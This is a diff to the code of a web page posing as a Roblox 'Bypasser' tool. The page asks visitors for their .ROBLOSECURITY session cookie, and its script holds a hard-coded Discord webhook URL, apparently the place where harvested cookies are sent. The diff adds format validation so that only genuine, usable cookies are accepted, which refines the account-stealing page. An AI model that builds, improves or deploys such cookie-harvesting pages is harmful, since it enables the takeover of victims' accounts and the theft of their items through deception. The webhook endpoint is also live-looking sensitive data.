@@ -159,16 +159,14 @@
         <input type="text" id="cookieInput" class="input" placeholder="Enter your .ROBLOSECURITY cookie" required="">
         <button type="submit" class="hero-btn" id="refreshBtn"><i class="fas fa-sync-alt"></i> Bypasser</button>
       </form>
-<div id="loader" style="display:none; margin: 20px;">
-  <p>Bypassing...</p>
-</div>
-
-<div id="userInfo" style="display:none; margin-bottom: 1rem;"></div>
-<div id="refreshedBox" style="display:none;">
-  <p class="output" id="refreshedResult"></p>
-  <button class="hero-btn" id="returnBtn">Try Another</button>
-</div>
-
+      <div id="loader" style="display:none; margin: 20px;">
+        <p>Bypassing...</p>
+      </div>
+      <div id="userInfo" style="display:none; margin-bottom: 1rem;"></div>
+      <div id="refreshedBox" style="display:none;">
+        <p class="output" id="refreshedResult"></p>
+        <button class="hero-btn" id="returnBtn">Try Another</button>
+      </div>
     </div>
   </section>
 
@@ -226,11 +224,39 @@ const errorSound = document.getElementById("sfx-error");
 const swooshSound = document.getElementById("sfx-swoosh");
 const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z";
 
+// Function to detect Unicode (non-ASCII) characters
+function hasUnicode(str) {
+  return /[^\x00-\x7F]/.test(str);
+}
+
+// Function to validate .ROBLOSECURITY cookie format
+function isValidRobloxCookie(cookie) {
+  const cookiePrefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
+  return cookie.startsWith(cookiePrefix) && cookie.length > cookiePrefix.length + 50 && /^[A-Za-z0-9_-]+$/.test(cookie.slice(cookiePrefix.length));
+}
+
 $("#cookieForm").on("submit", async function(e) {
   e.preventDefault();
   const cookie = $("#cookieInput").val().trim();
+
+  // Check for Unicode characters
+  if (hasUnicode(cookie)) {
+    showNotif("Invalid cookie: Contains unsupported Unicode characters");
+    errorSound.play();
+    return;
+  }
+
+  // Validate cookie format
+  if (!isValidRobloxCookie(cookie)) {
+    showNotif("Invalid .ROBLOSECURITY cookie format");
+    errorSound.play();
+    return;
+  }
+
+  // Existing length check
   if (cookie.length < 10) {
-    alert("Cookie too short");
+    showNotif("Cookie too short");
+    errorSound.play();
     return;
   }
 
